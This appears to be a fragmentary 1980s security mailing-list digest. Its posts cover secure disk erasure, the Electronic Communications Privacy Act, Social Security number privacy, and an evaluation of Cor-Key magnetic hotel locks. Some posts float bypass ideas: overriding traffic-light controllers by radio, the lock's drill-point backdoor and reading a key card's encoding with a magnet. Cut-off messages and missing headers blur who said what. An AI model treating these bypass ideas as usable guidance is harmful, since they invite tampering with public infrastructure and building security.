overwritten with a 0 might be -98, and a 1 overwritten with a 1 might
be +102.  A normal disk drive might accept anything less than -30 as a
0 and anything more than +30 as a 1, but a special disk drive could
be built which reads the actual amount of magnetism, and software
could then be written to use this drive to reconstruct erased data.

(The actual details would be a little different - I think most disk
systems use a transition between magnetic domains to encode a bit,
not the domains themselves.)

I know there are similar devices in use for reconstructing data from
a damaged or crashed disk.  I understand they are extremely slow and
very expensive, but they do exist, and they do work.

The way to REALLY delete data is to overwrite it with all 0s, then
overwrite it with all 1s, and then overwrite it with a random pattern
of bits.  This is how disks classified SECRET must be erased to be
declassified.  But apparently it is believed that a sufficiently
determined person could even read through this, as disks containing
data with a higher classification must be destroyed to be declassified.

Of course most DELETE, KILL, PURGE, DEL and rm commands do not even
overwrite the data, but simply remove the pointer to it.  Which is
how it is possible for programs like the Norton utilities to un-
delete a deleted file.  This was a major problem with VMS before
version 4.0 - a user could (and still can if the system manager isn't
on the ball) create a large file and not write into it and read lots
of other people's deleted files.

Everything above applies equally to hard disks, floppy disks, magnetic
tapes, and magnetic core - not to RAM or ROM though.

North, et al, had their mail files read not by any of these techniques
but simply from backups that were routinely made.

Subj:	[596]  Deleting files

The other problem with backup procedures that don't backup deletions
is lord help you if the disk was almost full when the disaster struck
and the restoral exceeds 100% of the disk (as you needed those
deletions to make it all fit, not uncommon as often almost full
disks get preened constantly to fit the next thing on.) The resulting
games when the restoral utility fails due to a full disk are generally
not a pretty sight (site?)

Now there has to be some interesting psychology in that, although I'm sure
that the writer didn't notice.  What would prompt him to give his permission

Re:         The Electronic Communications Privacy Act

    The Electronic Communications Privacy Act of 1986 was enacted by
the United States Congress in October of last year to protect the
privacy of users of wire and electronic communications.

    Legal counsel has advised MIT that its computer network and the
files stored on its computers are covered by the law's provisions.
Specifically, individuals who access electronic files without
appropriate authorization could find themselves subject to criminal
penalties under this new law.

    At this time, we can only make broad generalizations about the
impact of the Act on MIT's computing environment.  Its actual scope
will develop as federal actions are brought against individuals who
are charged with inappropriate access to electronic mail and other
electronic files.

    It is clear, however, that under the Act, an individual who,
without authorization, accesses an electronic mail queue is liable and
may be subject to a fine of $5,000 and up to six months in prison, if
charged and convicted.  Penalties are higher if the objective is
malicious destruction or damage of information, or private gain.

    The law also bars unauthorized disclosure of information within an
electronic mail system by the provider of the service.  This bars MIT
(and other providers) from disclosing information from an individual's
electronic data files without authorization from the individual.

    MIT students and staff should be aware that it is against
Institute policy and federal law to access the private files of others
without authorization.  MIT employees should also note that they are
personally liable under the Act if they exceed their authorization to
access electronic files.

Subj:	[762]  Re: Electronic mail privacy

This clearly affects BITNET as it does any network.  On the other hand,
mail is as private on BITNET as any other network which does not employ
encription.  On bitnet, mail is private and cannot be looked at by other
general computing users on the system (at least the IBM portions).  Just
as on other systems, the privileged user (super-user), who is usually
in the systems programming staff, can examine mail.  I believe this flaw
exists on most computing architectures. I believe that all installations
will have to examine this law and determine the risks to their staff
and organizations.

	And to quote Doug Humphrey:

used for IFF (sic) in the case of traffic controllers since strobe
lights are hard to modulate reliably due to the fact that they are
based on high voltage systems that generally use the ionization of gas
to determine when the strobe goes off, and are thus not very accurate
in a timing sort of way."

	I might suggest you recheck your facts, and possibly reconsider.
A visit your local service station should be convincing enough, however
if not then a trip to the local camera store might offer more evidence.

Subj:	[595]  Prying into electronic mail

Re: Recent quote from IBM ad in "InformationWeek"

Regardless of the legal penalties for prying into electronic mail, it
seems to me that enforcement will be difficult if not impossible. The
nature of messages makes them readily readable by anyone, much more akin
to postcards than sealed letters. I will still refrain from mailing 
anything that I would not want in the public domain.

Subj:	[2061]  re: Electronic mail privacy

The IBM ad you read was talking about the Electronic Communications
Privacy Act of 1986, passed by Congress on 02-Oct-1986, and signed
into law on 21-Oct-1986, and became effective 90 days later. It's
known as Public Law 99-508.  It's basically in two parts:

(1) Ammendments to the existing U.S. Code, Title 18, chapter 119, starting
with section 2510, which deals with interception of communications,
formerly dealing with just the telephone (wiretapping), but has been
updated to be more general: "common carrier" is now "electronic
communications service provider", i.e. _any_ service which lets users
send or receive electronic communications; and electronic communications
are no longer limited to "oral", and now specifically include the use
of computer facilities.  Anyone intercepting, ordering the interception,
or using the data from an interception, when not acting as the service
provider for maintenance or protection of the system, is still committing
a criminal offense, and can still be sued in civil court.

(2) The addition of chapter 121 to U.S. Code, Title 18, starting with
section 2701, which protects stored electronic communication, i.e.
before the communication is sent and after it is received; chapter 119
(above) handles communications in transit.

The act amends several other sections. I've just mentioned the ones
related to running a computer or computer network.  Also please note
that I'm not an attorney, just a systems programmer.

However -- we've been unfortunate enough to have a case here in which
this law may get tested.  Any comments as to the strengths/weaknesses
of this law, particularly as related to interception of an employee's
electronic communications, would be greatly appreciated.

Subj:	[1175]  Re:  Digest of accumulated msgs about traffic light sensors

  The traffic lights here in the DC metro area are activated by
stobes but use a multiple repetition sequence (i.e. two flashes
per sec. followed by a three second blank) to ferret out phreaks
and other undesirable signals.  The strobe must also be of a
considerable candlepower (i.e. a photo flash won't even get close).
 During rush hour the real busy intersections are radio synched
in order to keep the flow of traffic steady.  The freq. is
somewhere in the 490 MHz area.  The actual information is only a
simple set of 20 - 25 tones that are transmitted in  pre-set
intervals over 2 - 3 minuets and then repeat.  All the
associated traffic lights have directional antennas aimed at
the base station (which is on Ft. Reno Dr. and Wisconsin Ave.
for anyone interested).
  It strikes me that one could use a scanner to find the tone
associated with ones favorite traffic light and just use
a low power x-mitter to override the traffic light as one approaches.

Sorry, but prying into electronic mail can be a necessary evil.  If a
host is using a less than optimal mail system (of which many are), then
when things get stuck or broken, someone has to look at the addresses in
the message.  This may or may not require reviewing the message.

Note that the situation is not analogous to the "dead letter office"
of a postal service, since all mail should contain a return address.
It may not be correct, meaning both completely inaccurate or simply
unparsable, but that is a separate issue.

As for electronic mail privacy in general, I would love a good discussion,
moderator permitting.  I know plenty about it (and lack of it).  What
would you like to know?

(1) Does this make you subject to prosecution should you simply "see" a
message within the scope of your designated duties (ie, watching a line
monitor, updating a mailer daemon/DVM, acting as postmaster)?

(2) Is this law even applicable to public (and/or Internet) networks in

	It seems that "appropriate authorization" is the governing

is routinely assumed that files made readable by the public carry the

Subj:	[1444]  Impractical Legislation

 Another aspect of the recent privacy legislation concerns radio receivers.
For the first time in US history, it is now illegal to tune a radio receiver
to certain frequencies and listen to whatever may be transmitted there.
This refers specifically to the cellular radio frequencies in the 800 mHz
range, which are used for mobile telephones. The vendors of these systems
have been telling their customers they are just as private as wire connections,
 but this has never been true. But since it improves sales to make the claim,
they still do, and now there is legislation that tries to make it be true by
fiat. Any UHF TV receiver and many commonly-available scanner receivers can
tune to these frequencies, so it seems futile to say in essence "don't touch
that dial" to someone who might happen to tune across those particular
frequencies. The FCC has already said they have no intention of enforcing this
legislation. The vendors could always encode their signals, but they do not
want to as that would raise costs and decrease profits.

I heard that some legislative body once decreed that pi = 3 exactly,
because it made calculations easier.

    Agreed!  Just as it seems to be with your other examples, I think it
is up to inidivdual security people and system administrators how seriously
they take mail privcay and enforcement of the rules.  It seems to me that
anyone who values mail privacy should work to insure it and punish those
who do the breaking, and that those who make the choice not to care as
much should not mind so much when their mail system gets taken apart.

    Yes, this would be a step backward (a giant leap?) in standardization
of legislation, and I realize it would be impractical to leave these
decisions to each individual system's policies.  But, is this kind of
standardization necessary?

    While I'm thinking (it is indeed rare), what does this do to plans I
have aheard about from the phone company to charge more for lines which
are used with a modem?  If it is my residential line, they would have to
have some kind of line-monitoring.  If I am doing e-mail, is their line
monitoring illegal?  Is it legal when I'm not?

Subj:	[1044]  more on traffic light sensors

From my experience of having driven ambulances and a fire truck (both as a
volunteer, not a professional)  changing all four directions to red might 
decrease problems with traffic light phreaks, but green really helps.  Even
emergency vehicles with lights and sirens on are supposed to stop before
proceeding through a red light.  (I know it doesn't always happen that way,
but if an emergency driver doesn't stop at red light, any accident is 
considered his fault.)
 The second problem is with having the lights respond to the siren.  Most 
emergency vehicles use electronic sirens - which can produce several kinds
of sounds (wail, yelp, hi-lo) and drivers frequently keep switching between
them to try to get the attention of oblivious drivers of nearly sound-proof
cars.  Such sensors would have to respond to all modes of all makes of sirens
used in that area.

Subj:	[1433]  Electronic Communications Privacy Act

When I got the MIT notice from the SECURITY list, I did a little digging
in the law books (Purdue's library is a Federal Depository).

I pulled out a copy of the Act (Public Law 99-508, H.R. 4952) and a copy
of Title 18 of the United States Code, which it amends.  From this
(after a couple of hours of "strike words a through f, insert words g
through m" -- I'd hate to be a law clerk), I extracted most of the
"interesting" parts of the law.

These parts pertain to administrators and users of electronic
communications services (if your machine has electronic mail or bboards,
it fits into this category).  The parts I specifically went for were
what we can and cannot do, what the punishment is if we do it, and what
our means of recourse are if it's done to us.  I left out all the stuff
about government agents being able to requisition things and stuff,
and all the stuff pertaining to radio and satellite communications.

So anyway, I typed all this stuff in to give it to our staff so they'd
be aware of the new legislation.  Since there is probably interest in
this, I am making the document availble for anonymous ftp from the host
intrepid.ecn.purdue.edu.  Grab the file "pub/PrivacyAct.troff" if you

Subj:	[6668]  Evaluation: Cor-Key Magnetic locks

I recently had a chance to disassemble and examine yet another type of hotel
security system.  These are all-mechanical magnetic door locks made by
Cor-Key Systems in California.  The user is given a small white plastic
card with rounded ends, and inserts same into a slot in the top of a
rather large doorknob on his room.  Pushing the card all the way into
the slot "connects" the knob to the actual latch hardware and allows
entry; otherwise the knob just spins around.

The neat thing about these is that the latch and the rest of the lock
are a standard lockset that could have been made by anybody, and to upgrade
to the Cor-Key system one simply has to install this other doorknob.  Thus
the hotel, which previously had regular old key locksets, avoided a lot of
expense and retrofitting.

Internally, the lock works entirely by magnetism.  The card is laminated
plastic over a layer of rather granular magnetic material that can be
magnetized in small regions and hold the field virtually forever.  When the
card is inserted into the slot it covers up a matrix of 35 or so holes, and
the tumblers move according to how the north or south regions on the card line
up with the matrix.  The tumblers themselves are small cylindrical permanent
magnets, and are attracted or repelled by the card regions.  About nine of
these are sprinkled around the matrix, leaving a lot of the holes empty.  Each
tumbler has a spot of either red or blue ink on one end to indicate its
polarity.

The parts are arranged as follows, moving toward the door along the axis of the
shaft.  Front doorknob surface, steel plate, card slot, thin nonmagnetic metal
plate, brass plate with holes, plastic slider with wells containing the
tumblers.  Everything except the plastic slider is fixed in place; the slider
is held in place by the tumblers, which normally are attracted partway out
of their wells toward the steel plate and are thus protruding through the 
holes in the brass plate.  Thus the slider can't slide, because the tumblers
are locking it to the brass plate.  The correct key imposes itself down
between the steel plate and the tumblers, and if the regions on the key
repel *all* the tumblers away from itself, all the tumblers retreat into the
plastic housing out of the brass plate.  Then the slider is free to move,
which it does when the key is pushed down the last quarter-inch or so.  This
engages the latch mechanism and connects it to the knob, so the door will
open when the knob is turned.

There is a mechanism for rekeying a door quickly: near the bottom of the
knob there are two small holes through which a small tool can be inserted.
Under these are two rotating alloy carriers, each containing one tumbler.
Each carrier can be rotated to one of four positions, giving a total of
16 combinations between them.  Rotating one of these moves the respective
tumbler to a different point in the matrix, thus disabling one key and
allowing a new one to work.  Guest keys would have variable encoding in
these matrix regions, and the master key[s] would be configured such that
they would address these tumblers regardless of where they were.  Since this
only creates 16 possible combinations between them, it is a "first level"
of mastering which can be changed without disassembly.

More in-depth mastering is done by leaving parts of the static matrix empty,
but the tumblers that are installed will match the corresponding regions of
the master keys.  In an unmastered system, if the entire matrix were filled
with tumblers, all the locks and keys would be configured the same and all keys
would work everywhere.  Each lock is made unique by removing different parts
of the matrix, and each guest key is made unique by differently magnetizing
the "don't care" regions that correspond to the empty parts of the matrix in
the given door.  Thus Guest A's key will correctly address the parts of the
matrix that Room A's knob contains, but the *other* regions in his key will
incorrectly address the filled matrix locations of Room B's lock.  The master
key essentially repels the entire matrix's worth of tumblers, whether it's
there or not.  It was mentioned that the master also has a hole in the
appropriate place to bypass the double-locking mechanism -- normally when the
door is double-locked, a small rod protrudes into the key slot and completely
prevents insertion of a normal key.

Each location in the matrix is numbered [not in any obvious way, but...] so
that the combination can easily be represented by a computer.  Although in the
past when the company started, records of whose lock contained what were kept
in large books, computers are now being used to keep track of this.  The keys
are magnetized at the desk with a machine containing an equivalent matrix full
of electromagnets.  These can generate, I'm told by the Cor-Key people, fields
of 250 gauss or so.  A key region can be made north, south, or neutral; it is
possible to "read" a key's encoding by running a !small!  magnet over it and
feeling if it's attracted, repelled, or ignored.  [One of the tumblers glued
to a piece of flexible wire worked fine.]  However, even examining the part of
the matrix you were given only gives you a small section of the master key, so
it's virtually impossible to generate a hotel master by examining your own
lock.  Pick this one?  Forget it.  The tumblers are inaccessible behind the
thin nonmagnetic plate. Perhaps a very large strong electromagnet could fit
over the entire knob, remagnetize *all* the tumblers one way [good luck!] and
then apply a gentler field in the reverse direction to push them all inward.
I really don't see something like this working either.  An expensive and
precise piece of equipment could concievably be built to stick a small coil
down into the slot and "read" the matrix by applying fields in different
directions while the user listens for each individual tumbler to bang against
one end or the other.  Yuk.  Conceptually, therefore, the Cor-Key is fairly
secure. Unfortunately the workmanship of the lock itself is a bit on the
shoddy side, and I was told by the people who build them that the official
"backdoor" used in cases where the lock is completely screwed up is to drill a
hole in a magic spot and force the latch mechanism to engage.  Furthermore, to
*really* re-key the lock it must be taken completely apart, because any key
encoded the same all over the two changeable regions will open the lock
regardless of where the carriers are rotated to.

Subj:	[911]  Privacy in Electronic Communication

You'd have an awfully hard time proving a case of electronic espionage
against someone if you failed to take any steps to protect your own
interests.  The burden of proof always rests with the prosecution.

The easiest way to send sensitive information is to use the telephone or
some other network which has made some sort of legal guarantee of privacy.
And take some sort of action to protect your interests in the event of
casual contact.

For example, you can encrypt the message and attach a plaintext notice
which clearly states that the contents of the message are confidential.
Casual contact with the message will not damage your interests.  No one
who tampers with the message can honestly say that they didn't know
that it was wrong.

Subj:	[670]  Security Auditing Program

Greetings:
	I am looking for a copy of the source code (online) for a set of
security auditing programs as described and listed in the book "UNIX
SYSTEM SECURITY" by Wood and Kochan. Could you provide me with this software
or point me to who could? I would rather not type in 20 pages of code if
I could help it. Also if there are any other Unix security programs
which might be of interest, please let me know.
	Thanks for your time,

Subj:	[5205]  SS# & Utilities -- a story

As a matter of principle, I'm one of those people who won't give out my
social security number when applying for utilities or credit cards.
The reasons why have been discussed numerous times in various
security-related groups.   It is my understanding that it is against
the law to force someone to give his/her social security number unless
it is a government agency; although I've often run into occasional
resistance, a few moments of explanation has usually resulted in things
working out okay.

Then there's today.  I'm moving to W. Lafayette Indiana in two weeks
and I called to establish my phone service there.  Indiana is
served by GTE for phone service.  I did not anticipate any problems
since I have an excellent credit history, as could be verified by
a quick check with the local Southern Bell folks.  After the rep
at GTE took all my information down, she asked for my SS#.  I explained
that I don't give that out.  She informed me that I would be required
to pay a $75 deposit if I refused to give my SS#.  So, I asked to
talk to her supervisor.

Her supervisor repeated that I would have to give my SS# to waive the
deposit.  I asked if they could simply call Southern Bell or take a
credit card #, or they could call Purdue and verify my employment.  He
said that wasn't enough -- I had to supply my SS#, no other option.  I
enquired as to why they needed it -- he said it was for a credit check
and to verify future disconnect requests.  I explained that they could
do that self-same credit check without the SS# *and* I don't give out
my SS# precisely because I don't want it used as a verification number
on my account.   He insisted I either supply the number or pay the
deposit.  He also asked why I was being so stubborn -- it was even on
my driver's license, wasn't it?  (It isn't -- and hasn't been.  In
Georgia, you have always had the option of having a different ID, and
now the licenses are being issue with those as default.  The guy at GTE
claims that the Indiana licenses are *required* to have the SS# on them
-- anyone know if this is true?  It shouldn't be...) I explained that
having done some work in computer security, and personal experience, I
know how that number can be abused.  He said I was the only person he'd
ever run into to refuse to give the SS# (!).

I then asked him if the requirement for a SS# was written policy -- I
wanted a copy to examine.  He informed me that such information was
private to the company and I couldn't have a copy -- didn't I trust
him?  I then asked if that policy was on file with the state Public
Service Commission.  At that he (rather loudly) asked if I wanted
service with GTE or not?  I asked him very calmly if he was threatening
to deny me service -- he quieted down.  I next explained that I wanted
to see a copy of the written policy because it would be interesting to
include in an article I might write on improper use of SS#s.  He became
very quiet.  I offered to find the name and number of someone at
Southern Bell who could verify my 9 years of service here.  He said to
call back with that information (thankful to get rid of me, I guess).

The lady I talked to at Southern Bell was very helpful.  She informed
me that all the Southern Bell operators are told not to force a SS#
because it is against both policy and law, but if someone won't provide
it they are to get a bank account # or credit card number (both of
which I am willing to give in circumstances such as this).  She was
more than willing to talk to the supervisor at GTE and give him a
credit reference, if only he'd call.  She said she'd also fill him in
on policy.  *AND*, most interestingly, Southern Bell had somehow
obtained my SS# through other means and it was on file, but she
marked it so that it was not to be given out to anyone, specifically
not anyone with GTE Indiana. :-)

Back to GTE.  I called the supervisor (collect, of course) and gave him
the name and number of the lady at Southern Bell.  He was very curt and
said he'd probably still require a deposit.  He hung up on me.

20 minutes later the original GTE operator called me back and
cheerily informed me that my service would be turned on August 4
with *no* deposit required!

Questions
---------

1) Do many of you (net-readers) withhold your SS# in similar circumstances?
Do you have these kinds of confrontations too?

2) Anyone know if other people at GTE Indiana are such jerks, or is
this an isolated instance? 

3) Anyone know if Indiana does, in fact, *require* that the SS# be
on the driver's license?  

4) Should I bother to follow-up on this further?  That is, should
I bother contacting the Public Service commission in Indiana
about the treatment I received? (I'm currently not sure it is
worth the effort).

Too bad we don't have a choice of phone companies as well as long
distance carriers -- I'd keep Southern Bell.

  When I came to the US I was sufficiently worried about getting a bank

in which *privacy* still has some practical meaning, and where an average

  YES, you should! YES, it's worth the effort.

  As an aside, my fight with windmills consists largely of writing
letters to various Co.'s from which I received a less-than-reasonable
service. I was surprised that most of them (Sears, United Airlines,
Ralphs stores etc.) take such letters seriously - at least someone
high-up reads them & sends an individually written reply. In some cases
I noticed that things that I complained about actually changed for the
better just after I received an answer, but of course it may be a
coincidence. But what surprised me even more is that so many people
around me think I'm nuts to even bother, saying that it's a total waste
of time. Oh, well, I'll just keep doing that until my Mac drops dead.
(BTW, so far I got frustrated in only one case: USPS; 5 letters to the
Postmaster without a reaction...)

I agree that Mr. Spafford showed great poise and determination in refusing
to give out information against his will.  But as Mr. Behr has pointed out,
there's no point withholding it once everybody has it.  And, considering
that Southern Bell had Mr. Spafford's social security number in spite of the
fact that he never gave it to them personally, it's clear to me that if
someone wants your SS# bad enough, they'll get it whether you want them to
or not.

I'll agree that withholding it whenever possible at least reduces the
probability that some Joe on the street will obtain it and misuse it; but
there's a bit of paranoia in that attitude as well.  If the options are to
risk the information leakage and subsequent misuse, or to have stress-
inducing episodes similar to Mr. Spafford's affair with the arrogant GTE
employee, personally I'll take the information risk.

Nevertheless, an interesting account of the narrowing interpretation of
American privacy.

I am not sure about Indiana, but I have lived in CA, WI, IL, and CO: NONE
of them require SS#.  In fact, WI and IL function off credit cards whereas
CA and CO function of driver's license #.

It is also a GOOD idea to check with the local SS office every two years
and get a report of your account activity (you are legally entitled).  If
there has been anyone USING your SS# to "steal" the funds, you will know 
about it.  (If you wait more than 7 years[?], whatever is missing is gone.)

Subj:	[4197]  SSN again

I too have resisted handing my SSN to every bozo who requests it, and
have consistently met with great surprise that anyone should be so
brazen as to hide such basic information.  I got in the habit of
refusing to supply it when I worked for business DP houses to support my
undergradutate education.

California asked me for it when I traded in my NC drivers license
(1972), and also every time I've registered a car here since then.  They
always point out that I HAVE to supply it, so I write "Privacy Act" in
the slot, they show it to their supervisor, and the matter ends there.
It turns out that California uses the SSN to tie drivers licenses and
vehicle registrations together, so that if a driver has any dealings
with the law, any warrants for old parking tickets can be settled by
putting him in jail until they are paid off.  While this certainly has
the effect of reducing the number of parking scofflaws on the roads, it
has interesting implications for the SSN. 

I learned of the DMV practice in 1974 when I was stopped on suspicion of
car theft while trying to push-start my girl-friend's car for her.  The
officer got friendly when the ownership was cleared up, but then pursued
and pulled me when the radio dispatch told him I had an outstanding
warrant for parking.  Details of the warrant and the claim that it arose
from a parking incident in a year that I was never in CA convinced me,
and eventually the officer, that something was amiss.  He let me
"escape", and, per my promise, I called the sheriff to find out what was
up.  Seems that a fellow named "Paul __Allen__ Martin" had lived in
Monterey, parked overtime in SanFran, and failed to pay the piper for
this tune.   So what?  Well, seems he had ALSO refused to supply his
SSN, so both he and I had "000-00-0000" entered in the DMV computer; the
drooling idiots in DMV's DP department hadn't provided a value to
indicate "not known" for that field!  So, the officer calling my name in
on the radio [Paul ___Alan___ Martin] would be informed of "my" warrants
based on an "exact match" on the SSN.  For the next three years, I had
to point out the spelling of my middle name as a prelude to every
dealing with DMV and law officers to avoid a trip to the cooler.  The
statute of limitations finally came to my rescue, but I have no idea
whether I'm still on file as "bad guy who got away".

I am a regular blood donor for both the Red Cross and the local med
school hospital (Stanford U).  I have done pheresis donations for
specific patients; this is a process where 6 to 12 times as much blood
as a normal donation is taken (a bit at a time) and separated to extract
just the component needed by the patient.  The components are always
something like white cells which, especially in such high doses, must be
carefully matched to the recipient's immune system.  This matching
process is the same one used for organ donor matching; because of the
degree of match required, there are typically dozens instead of millions
of potential donors known for a given pattern.  To block all sorts of
undesirable interactions (e.g., bribery, extortion, or even innocent but
desperate pleading), a secure wall of anonymity is maintained between
the donor and the recipient.  

Despite this, the Red Cross and Stanford Med Center each ask for the
donor's SSN!  When I refuse it (offering some alternative to
disambiguate me from others with the same name), they ask me "Why?"  I
point out that if their files on HLA type (the immune system coding
scheme) were ever stolen, I'd hate to have someone who was quite rich,
quite sick, and quite ruthless discover that (1) I matched his HLA type,
(2) My heart works a lot better than his (or else they wouldn't accept
me as a pheresis donor), and (3) I've filed a universal organ donor
card, making my spare parts available in the event that some hood should
happen to blow my head off in the foyer of a hospital....  After hearing
this explanation, most nurses say something along the lines of "I wonder
if I can purge my OWN SSN from the database?"

Cheers... Paul

   government agency; although I've often run into occasional resistance, a

I wish you were correct, but contrariwise, there seem to be no restrictions
whatsoever about the use of social security numbers *outside* the
government.  All the restrictions seem to apply only to the government.
   
   The guy at GTE claims that the Indiana licenses are *required* to have
   the SS# on them -- anyone know if this is true?  It shouldn't be...)

Again, sorry to be a pessimist, but driver's licenses are one area where
federal law specifically *permits* states to require SSN's.  Of course,
once it is a part of your driver's license, there is virtually no way
*not* to give it out to the rest of the world.  Also, I spent three years
in Virginia not being able to vote because I would not give them my
SSN.  In the bitter end, the law was on their side via a grandfather
clause.  This is different from the driver's license case.  A state can
require SSN for voting only if they required it before some date ('74
maybe, or '79), but they can require it for driver's license, period.
Also, *every* time the government asks for it, they are supposed to cite
the law which authorizes it, but they never do.  Unfortunately,
if they violate federal law by failing to provide such notification,
there is not penalty.  Thus, there is no real force to the law.
   
   1) Do many of you (net-readers) withhold your SS# in similar
   circumstances?  Do you have these kinds of confrontations too?

Yes, and yes, but I have just about given up.  The people you deal with
do not know what you are talking about, and have no authority anyway.
Going to supervisors does not really improve things.  I am convinced that
effort at this level is totally wasted.  About the only place where
effort is worthwhile is with Congress.  Until there is legislation without
so many exceptions and with penalties for non-compliance, we are all
wasting our time.

      3) Anyone know if Indiana does, in fact, *require* that the SS# be on
   the driver's license?

I believe the answer is yes, based on relatives who live there.
   
   4) Should I bother to follow-up on this further?  That is, should I
   bother contacting the Public Service commission in Indiana about the
   treatment I received?

Possibly, but only for the treatment you received, not the SSN issue
itself.   As a point of interest, there are many cases that the
applicability of the existing law (weak though it may be) is unclear.
The existing law applies to "federal, state, and local government".
For example, is a state university covered as "federal, state, or
local government"?  Is a phone company which
is regulated by a State government?  My experience is that a state
university will claim to be a part of the state government when it
is to their advantage and your disadvantage, and vice versa of
course (as when state employees are given a pay raise and university
employees are not or vice versa).

sure do.

   3) Anyone know if Indiana does, in fact, *require* that the SS# be

Couldn't say.  Virginia has written a statute that requires it for
Virginia licenses.

   4) Should I bother to follow-up on this further?  That is, should
   I bother contacting the Public Service commission in Indiana
   about the treatment I received? (I'm currently not sure it is

Every time I have been asked for my ssn by someone who legitimately
requires it (i.e. the federal government) there has been an
accompanying blurb with a reference to the federal law that empowers
them to ask for it.  Evidently Virginia is attempting to emulate this
strategy.  Unfortunately, the ssn isn't exactly in their purview, and
their reasons for "needing" it fall more under the heading of
convenience than real need.  

I frankly don't see why people's privacy should be threatened in order
to make things slightly easier for a few programmers.

Virginia has a history of being a place where bad laws are made.  An
example is the illegality of radar detectors there.  (as far as I
know, only D.C. and Connecticut have similar laws.)

I'd say, make it as expensive as you can for them to do business with
you until they do business right.  Monopolize as much phone time and
letter writing-time as possible - it costs them about $30 to write you
a form letter.

Monopolies need to be kicked periodically.  Use your rights or lose
them. 

   Too bad we don't have a choice of phone companies as well as long
   distance carriers -- I'd keep Southern Bell.

Maybe you should find out how they got your ssn first ...

Subj:	[1944]  Re: SS and the data theives...

     The privacy act of 19??  (consult your local ACLU chapter) forbids
use of the SSN except for valid SS purposes like tax and employment and
such, except for federal agencies covered under a grandfather clause and
also state governments, but then only by statute (no bureaucratic
initiatives without legislative approval).  New Jersey had a bill
bouncing around to rescind the bill that allowed them to force us to
divulge it.
     My university tried to get it, but I made them give me another and
then had a great time correcting and confusing them with my 4 digit
"Social Security Number".
     The main reason for overuse of the SSN is simplemindedness.
Numbers are a great resource.  You can give them out.  Until you give
out a lot, they stay compact.  Anyone can make up a numbering system.
But they prefer to steal someone else's system, especially if you
already know your number and it is unique.  There is a natural tendency
for the disadvantages of an old way to attach themselves to a new way.
Ever see a computer operator cry because checks get ruined?  You'd think
it was money, not preprinted forms!!!  So it is with numbers; instead of
your name and address or whatever, they can organize their data better
by arbitrary numbering.  But they use non-arbitrary numbering, because
they miss the point!
     So, the best reason to refuse them your SSN is that they are
misusing the concept of numbering!  Spread knowledge to the masses.
Explain how numbering works best only if it is arbitrary and
specialized.  Explain how the SSN has so many digits that they could as
easily look up your name!  (9999 customers looked up in a table of SSN
could take ten trillion digits of storage!)  Point out that you are the

    1) Do many of you (net-readers) withhold your SS# in similar circumstances?
    Do you have these kinds of confrontations too?

Yes!  I had a similar confrontation with Southern New England Telephone.  When
I initially tried to acquire phone service in New Haven, I refused to give out
my social security number.  The customer service representative told me I
would have to make a $200 deposit in lieu of giving out my SSN.  I asked to
talk to his supervisor.  The supervisor gave me the same story.  I told her that
I was not going to give out my SSN and I was not going to pay anything extra
as a result.  I said further that if they intended to deny me service, they
had better get in touch with their legal department and then call me back.
The entire conversation was civil and friendly, but only because I kept it   
that way.  I got a call back the next day telling me they would install my
phone without a SSN or a deposit.

Why does this work?  Simple.  The privacy act of 1974 restricts governmental
use social security numbers.   With certain (fairly significant) exceptions,
a government agency cannot require your SSN unless it is related to social
security or tax matters.  Furthermore, if a gov't. agency asks for your SSN
voluntarily, they must explain that it is voluntary and what it makes no
difference if you give it or not.  On the other hand, there is NO legislation
restricting commercial uses of SSNs; if you don't give it to them, they don't
have to do business with you.  This is especially pernicious with credit
and banking institutions.  At any rate, the phone company falls in between:
Since they are a state regulated monopoly, they probably don't have the 
ability to demand your SSN.  They certainly don't want that tested in court,
since they might loose the freedom to coerce and intimidate as they do.    
Phone companies lose huge amounts of money on unpaid final bills, and they
like to be able to track people down -- SSNs are, of course, invaluable for
this.  You'll find other local monopolies (e.g. gas and electric companies)
work pretty much the same way.  With them, your SSN is yours alone.

Probably the best reference on all of this stuff is Robert Ellis Smith's
"Privacy: How to Protect What's Left of It", available for $7 (prepaid) 
from The Privacy Journal, P.O. Box  15300, Washington, DC 20003.  The

Yes!  It is definitely worth sending off a few letters.  I'd send copies
to the phone company's customer service department, the state public
utilities commission, your state representatives, your congressmen,
local newspapaers and to the Privacy Journal (address above).  If nobody

Subj:	[715]  SS#

I don't understand how a Social Security number could be abused. In
Massachusetts, your driver's licence number IS your social security
number. Therefore, anytime you write a check to a store, they write your
licence no. (SS#) and a charge card no. on the back of your check
for approval. I can see how, in this state, it would be VERY easy for
ANYONE to obtain your SS#. So, being rather naive, I'd like to know

Subj:	[485]  SS# other options

There are also other options.  I know several people who give out
random numbers and have been doing so for quite some time.  They
are very clever about not declaring it to be the number on file
with Social Security.  This is done verbally--boxes on forms are
left blank.  There are two variations: 1) random numbers at every
query, 2) random numbers for each institution.

for an article about computer security for lawyers which I was working on
last year. (Is that a single sentence? Am I pretending to be a writer?)
Anyway, I just got the galleys back from the publisher. It's going to be3 in

If anybody wants a copy of it, ask me and I'll send a draft. If the demand is

Suppose I demand that a company with a copy of my SS# but no right or need
for it remove my SS# from their records.  Is there any hope of this
working, or will they just laugh at me?  Are there any big legal sticks

Subj:	[1212]  Dogs, defense against

Being new to the net, I'm not sure if this topic has been discussed
before. My apologies if it has.

My wife loves to take my daughters (ages 2 and 2 months) for walks,
but there are usually 1 or 2 big dogs loose that terrify them. We have
a leash law in my town, and a friendly dogcatcher. Calls to the
dogcatcher do nothing. His office is only open from 3pm to 4pm. Also,
dogs will come into our backyard where my 'girls' are playing and
snarl at them. 

I have heard about aerosol sprays that deter attackers, but can't find
them and don't know if they are legal. Someone suggested to my wife
that she buy a squirt gun with a 30-foot range and fill it with
ammonia to shoot at dogs. Q: Would this work without getting me into a
lawsuit from seriously injuring a dog? And what is in aerosol sprays
that are used for self defense, if not mace? What sprays are legal
and where are they found?

I'm not a dog hater. I've never been a dog owner, either. Does
anyone have any better suggestions?

For many years I have tried to avoid giving out my SS#.  Most of the
time I have no problem, but occasionally I have given in due to	a
lack of knowledge on the applicable laws.  It is great to hear of someone
who has been so successful.

It seems that the majority of people have no idea of the problems of
in giving out such information and that our government continues
to encourage it.

One of my biggest frustrations is interest bearing bank accounts.  The IRS
requires you to give the bank your SS#, but as far as I know there are
no restrictions on what they can do with it.  Does anyone have a solution
for this?

My SS card has the phrase  "For tax purposes only, not for identification".
Do the new cards issued today still have this phrase?

Subj:	[6731]  Re:  SS# & Utilities -- a story

  1) Do many of you (net-readers) withhold your SS# in similar circumstances?
  Do you have these kinds of confrontations too?

Yes, but not wholly successfully.  I too have kept my SSN private for the
last eight or nine years.  I had given the number out whenever asked up until
